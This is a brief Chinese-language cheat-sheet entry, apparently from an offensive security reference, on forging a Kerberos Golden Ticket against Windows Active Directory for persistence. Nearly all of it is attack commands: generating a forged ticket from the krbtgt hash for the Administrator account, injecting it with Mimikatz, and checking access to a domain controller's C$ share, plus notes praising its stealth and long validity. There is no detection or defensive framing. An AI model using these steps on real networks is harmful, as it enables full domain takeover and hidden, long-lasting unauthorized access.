### Golden Ticket

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Windows |
| 风险 | 🔴 高 |
| 标签 | `权限维持` `Kerberos` `AD` |

## 黄金票据伪造与注入

### 生成黄金票据
```bash
bash golden_ticket.sh /domain:contoso.com /sid:S-1-5-21-123... /krbtgt:1234... /user:Administrator /ticket:golden.kirbi
```

### 将票据注入当前内存 (使用 Mimikatz)
```bash
mimikatz # kerberos::ptt golden.kirbi
```

### 验证票据是否生效
```bash
dir \\DC01\C$
```

- ✓ 伪造域内任意用户权限
- ✓ 隐蔽性高，票据有效期长
- 需预先获取 krbtgt 的 NTLM Hash
